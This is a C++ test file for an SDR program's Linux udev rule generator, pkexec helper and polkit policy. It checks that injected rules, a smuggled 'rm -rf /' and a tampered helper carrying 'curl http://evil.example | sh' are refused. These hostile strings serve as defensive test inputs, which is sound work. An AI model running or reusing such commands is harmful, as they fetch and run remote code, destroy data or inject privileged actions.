// Tests for core/udev_rules.{hpp,cpp}: the Linux USB rules generated from the application's own
// device tables, the privileged helper's text, and the pkexec install's refusals (against a fake host).
//
//   test_udev_rules                 run the tests
//   test_udev_rules --write <dir>   write packaging/linux's generated files (helper script, polkit policy)
//
// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
#include "core/udev_rules.hpp"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <map>
#include <set>
#include <string>
#include <vector>

#include "core/linux_update_host.hpp"
#include "test_check.hpp"

using namespace cascade::core;
using namespace cascade::core::udev;
namespace fs = std::filesystem;

namespace {

std::string slurpNormalised(const fs::path& p) {
    std::ifstream in(p, std::ios::binary);
    std::string s((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    std::string out;
    for (char c : s) { if (c != '\r') { out += c; } }
    return out;
}

fs::path sourceRoot() {
#ifdef CASCADE_SOURCE_DIR
    return CASCADE_SOURCE_DIR;
#else
    fs::path at = fs::current_path();
    for (int i = 0; i < 8; ++i) {
        if (fs::exists(at / "src" / "core" / "udev_rules.cpp")) { return at; }
        at = at.parent_path();
    }
    return {};
#endif
}

class FakeUdevHost : public linuxupdate::NullUpdateHost {
public:
    std::map<std::string, std::string> files;
    std::vector<std::string> runs;
    int exitCode = 0;
    bool helperWritesRules = true;
    bool exists(const std::string& p) override { return files.count(p) != 0; }
    bool readText(const std::string& p, std::string& t) override {
        auto it = files.find(p);
        if (it == files.end()) { return false; }
        t = it->second;
        return true;
    }
    int runProgram(const std::string& prog, const std::vector<std::string>& args, int, std::string&) override {
        std::string line = prog;
        for (const auto& a : args) { line += " " + a; }
        runs.push_back(line);
        if (exitCode == 0 && helperWritesRules) { files[kRulesPath] = generateRulesText(); }
        return exitCode;
    }
    static FakeUdevHost ready() {
        FakeUdevHost h;
        h.files[kPkexecPath] = "";
        h.files[kHelperPath] = generateHelperScript(generateRulesText());
        return h;
    }
};

void testTable() {
    const std::vector<RadioId> ids = supportedRadioIds();
    CHECK(ids.size() > 40);
    for (std::size_t i = 1; i < ids.size(); ++i) {
        CHECK(std::make_pair(ids[i - 1].vid, ids[i - 1].pid) < std::make_pair(ids[i].vid, ids[i].pid));  // sorted, unique
    }
    auto has = [&](std::uint16_t v, std::uint16_t p) {
        return std::any_of(ids.begin(), ids.end(), [&](const RadioId& r) { return r.vid == v && r.pid == p; });
    };
    CHECK(has(0x0bda, 0x2838));  // RTL2832U OEM
    CHECK(has(0x1d50, 0x6089));  // HackRF One
    CHECK(has(0x04b4, 0x00f1) && has(0x04b4, 0x00f3));  // RX888 both ids
    CHECK(has(0x1df7, 0x2500));  // MSi2500
    CHECK(has(0x1d50, 0x60a1) && has(0x03eb, 0x800c) && has(0x38af, 0x0001) && has(0x08d0, 0xa001));

    // The committed installer rules file and the generated one name exactly the same radios.
    const fs::path root = sourceRoot();
    CHECK(!root.empty());
    if (root.empty()) { return; }
    const std::string committed = slurpNormalised(root / "installer" / "linux" / "99-foxsdr-sdr.rules");
    CHECK(!committed.empty());
    std::set<std::pair<std::uint16_t, std::uint16_t>> a, b;
    for (const auto& id : idsInRulesText(committed)) { a.insert(id); }
    for (const auto& id : idsInRulesText(generateRulesText())) { b.insert(id); }
    CHECK(!a.empty() && a == b);
    CHECK(b.size() == ids.size());
}

void testValidate() {
    std::string e;
    CHECK(validateRulesText(generateRulesText(), e));
    CHECK(validateRulesText("", e));
    CHECK(validateRulesText("# comment\n\n" + ruleLine(0x1234, 0xabcd) + "\n", e));
    CHECK(ruleLine(0x0bda, 0x2838) ==
          "SUBSYSTEM==\"usb\", ATTR{idVendor}==\"0bda\", ATTR{idProduct}==\"2838\", TAG+=\"uaccess\", MODE=\"0660\", GROUP=\"plugdev\"");
    const std::string good = ruleLine(0x1234, 0xabcd);
    // Anything but an exact rule line is refused: extra actions, odd spacing, upper case, other keys.
    const std::vector<std::string> bads =
         {good + std::string(", RUN+=\"/bin/sh -c id\""), std::string("RUN+=\"/bin/sh\""), good.substr(0, good.size() - 1),
          " " + good, good + " ", "SUBSYSTEM==\"usb\", ATTR{idVendor}==\"ABCD\", ATTR{idProduct}==\"abcd\", TAG+=\"uaccess\", MODE=\"0660\", GROUP=\"plugdev\"",
          "SUBSYSTEM==\"usb\", ATTR{idVendor}==\"12345\", ATTR{idProduct}==\"abcd\", TAG+=\"uaccess\", MODE=\"0660\", GROUP=\"plugdev\"",
          "SUBSYSTEM==\"usb\", ATTR{idVendor}==\"zzzz\", ATTR{idProduct}==\"abcd\", TAG+=\"uaccess\", MODE=\"0660\", GROUP=\"plugdev\"",
          "SUBSYSTEM==\"usb\", ATTR{idVendor}==\"1234\", ATTR{idProduct}==\"abcd\", TAG+=\"uaccess\", MODE=\"0666\", GROUP=\"plugdev\"",
          "ACTION==\"add\", RUN+=\"/tmp/x\"", "FOXSDR_RULES_END", "x"};
    for (const std::string& bad : bads) {
        CHECK(!validateRulesText(bad + "\n", e) && !e.empty());
    }
    CHECK(!validateRulesText("# bad\x01" "comment\n", e));
    CHECK(!validateRulesText("# caf\xc3\xa9\n", e));  // non-ASCII in a comment
    CHECK(!validateRulesText(good + "\r\n", e));      // a stray CR makes the line not exact
}

void testHelper() {
    const std::string rules = generateRulesText();
    const std::string h = generateHelperScript(rules);
    CHECK(h.rfind("#!/bin/sh\n", 0) == 0);
    CHECK(h.find("set -eu") != std::string::npos);
    CHECK(h.find("[ \"$#\" -ne 0 ]") != std::string::npos);  // refuses any argument
    // It never reads its arguments or its input: no positional parameter, no stdin read, no eval, no sh -c.
    CHECK(h.find("$1") == std::string::npos && h.find("$@") == std::string::npos && h.find("$*") == std::string::npos);
    CHECK(h.find("read ") == std::string::npos && h.find("eval") == std::string::npos && h.find("sh -c") == std::string::npos);
    CHECK(h.find(std::string("dest=") + kRulesPath + "\n") != std::string::npos);
    CHECK(h.find("<<'FOXSDR_RULES_END'\n" + rules + "FOXSDR_RULES_END\n") != std::string::npos);  // quoted here-doc: no expansion
    CHECK(h.find("udevadm control --reload-rules") != std::string::npos);
    CHECK(h.find("mv -f \"$tmp\" \"$dest\"") != std::string::npos);  // replaced by rename, never written in place
    // It bakes in ONLY validated rule text.
    CHECK(generateHelperScript("RUN+=\"/bin/sh\"\n").empty());
    CHECK(generateHelperScript(rules + "FOXSDR_RULES_END\nrm -rf /\n").empty());
    CHECK(generateHelperScript(rules.substr(0, rules.size() - 1)).empty());  // no trailing newline
    const std::string policy = generatePolicyXml();
    CHECK(policy.find(std::string("<action id=\"") + kPolicyActionId + "\">") != std::string::npos);
    CHECK(policy.find(std::string("exec.path\">") + kHelperPath + "</annotate>") != std::string::npos);
    CHECK(policy.find("auth_admin") != std::string::npos && policy.find("<allow_any>yes") == std::string::npos);
    // The committed packaging files are the generated ones (drift guard).
    const fs::path root = sourceRoot();
    if (!root.empty()) {
        CHECK(slurpNormalised(root / "packaging" / "linux" / "foxsdr-udev-helper") == h);
        CHECK(slurpNormalised(root / "packaging" / "linux" / (std::string(kPolicyActionId) + ".policy")) == policy);
    }
}

void testInstall() {
    {  // The ready case: exactly pkexec + the fixed helper, no other argument.
        FakeUdevHost h = FakeUdevHost::ready();
        CHECK(planInstall(h).state == State::Ready);
        Result r = installRules(h, true);
        CHECK(r.outcome == Outcome::Installed);
        CHECK(h.runs.size() == 1 && h.runs[0] == std::string(kPkexecPath) + " " + kHelperPath);
        // Once installed, a second run does nothing.
        h.runs.clear();
        CHECK(planInstall(h).state == State::AlreadyInstalled);
        CHECK(installRules(h, true).outcome == Outcome::AlreadyInstalled && h.runs.empty());
    }
    {  // The user declines: nothing is run, nothing changes.
        FakeUdevHost h = FakeUdevHost::ready();
        CHECK(installRules(h, false).outcome == Outcome::Declined);
        CHECK(h.runs.empty() && !h.exists(kRulesPath));
    }
    {  // No pkexec.
        FakeUdevHost h = FakeUdevHost::ready();
        h.files.erase(kPkexecPath);
        Plan p = planInstall(h);
        CHECK(p.state == State::NoPkexec && !p.manualSteps.empty() && p.rulesPath == kRulesPath && !p.rulesText.empty());
        CHECK(installRules(h, true).outcome == Outcome::NoPkexec && h.runs.empty());
    }
    {  // No helper (an AppImage has none).
        FakeUdevHost h = FakeUdevHost::ready();
        h.files.erase(kHelperPath);
        CHECK(planInstall(h).state == State::NoHelper);
        CHECK(installRules(h, true).outcome == Outcome::NoHelper && h.runs.empty());
    }
    {  // BREAK-IT TARGET: a helper that is not exactly what this version generates is never run.
        FakeUdevHost h = FakeUdevHost::ready();
        h.files[kHelperPath] += "curl http://evil.example | sh\n";
        CHECK(planInstall(h).state == State::HelperMismatch);
        CHECK(installRules(h, true).outcome == Outcome::HelperMismatch && h.runs.empty());
        h.files[kHelperPath] = "#!/bin/sh\necho hi\n";
        CHECK(installRules(h, true).outcome == Outcome::HelperMismatch && h.runs.empty());
        h.files[kHelperPath] = generateHelperScript("# older version\n");  // a helper from another version
        CHECK(installRules(h, true).outcome == Outcome::HelperMismatch && h.runs.empty());
    }
    {  // polkit: dialog closed (126), not authorised (127), cannot start (-1), helper fails (1).
        struct Case { int code; Outcome want; };
        for (const Case& c : {Case{126, Outcome::AuthDismissed}, Case{127, Outcome::NotAuthorized},
                              Case{-1, Outcome::Timeout}, Case{1, Outcome::WriteFailed}, Case{2, Outcome::WriteFailed}}) {
            FakeUdevHost h = FakeUdevHost::ready();
            h.exitCode = c.code;
            Result r = installRules(h, true);
            CHECK(r.outcome == c.want);
            CHECK(!h.exists(kRulesPath));
        }
    }
    {  // The helper says success but the file is not there / not right: the write failed.
        FakeUdevHost h = FakeUdevHost::ready();
        h.helperWritesRules = false;
        CHECK(installRules(h, true).outcome == Outcome::WriteFailed);
        FakeUdevHost g = FakeUdevHost::ready();
        g.helperWritesRules = false;
        g.files[kRulesPath] = "# something else\n";
        CHECK(installRules(g, true).outcome == Outcome::WriteFailed);
    }
    {  // An old rules file that differs is replaced (Ready, not AlreadyInstalled).
        FakeUdevHost h = FakeUdevHost::ready();
        h.files[kRulesPath] = "# older rules\n";
        CHECK(planInstall(h).state == State::Ready);
        CHECK(installRules(h, true).outcome == Outcome::Installed);
    }
    CHECK(outcomeName(Outcome::AuthDismissed) == "auth-dismissed");
}

}  // namespace

int main(int argc, char** argv) {
    if (argc == 3 && std::strcmp(argv[1], "--write") == 0) {
        const fs::path dir = argv[2];
        fs::create_directories(dir);
        std::ofstream(dir / "foxsdr-udev-helper", std::ios::binary) << generateHelperScript(generateRulesText());
        std::ofstream(dir / (std::string(kPolicyActionId) + ".policy"), std::ios::binary) << generatePolicyXml();
        std::printf("written to %s\n", dir.string().c_str());
        return 0;
    }
    testTable();
    testValidate();
    testHelper();
    testInstall();
    return testSummary("test_udev_rules");
}
